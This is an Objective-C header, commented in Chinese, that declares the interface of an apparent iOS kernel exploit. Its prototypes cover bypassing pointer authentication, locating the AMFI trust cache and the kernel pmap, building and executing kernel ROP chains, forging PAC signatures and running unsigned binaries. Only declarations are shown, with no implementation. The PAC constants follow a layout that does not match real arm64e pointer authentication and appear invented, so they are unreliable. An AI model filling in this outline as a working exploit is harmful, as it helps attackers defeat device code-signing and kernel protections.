#ifndef RPACExploit_h
#define RPACExploit_h

#import <Foundation/Foundation.h>

// PAC相关常量
#define PAC_MASK_PTR                0x0000000fffffffff
#define PAC_SIGN_KEY_MASK           0x0000000f00000000
#define PAC_SIGN_CODE_KEY           0x0000000100000000
#define PAC_SIGN_DATA_KEY           0x0000000200000000
#define PAC_SIGN_IA_KEY             0x0000000400000000

// RPAC绕过主函数
bool exploit_rpac_kernel_protection(void);
bool exploit_rpac_bypass(void);

// RPAC辅助函数
void initialize_kernel_gadgets(void);
uint64_t find_amfi_trust_cache(void);
uint64_t find_kernel_pmap(void);
uint64_t find_amfi_validate_func(void);
uint64_t create_kernel_rop_chain(uint64_t *gadgets, size_t gadget_count);
uint64_t kernel_allocate(size_t size);
bool execute_kernel_rop_chain(uint64_t chain_addr);
uint64_t find_kernel_thread(void);
bool setup_rpac_bypass_primitives(void);
bool verify_rpac_bypass_success(void);

// PAC辅助函数
uint64_t strip_pac(uint64_t pointer);
uint64_t sign_pac(uint64_t pointer, uint64_t context, uint64_t key_type);
bool execute_unsigned_binary(const char* path);

#endif /* RPACExploit_h */
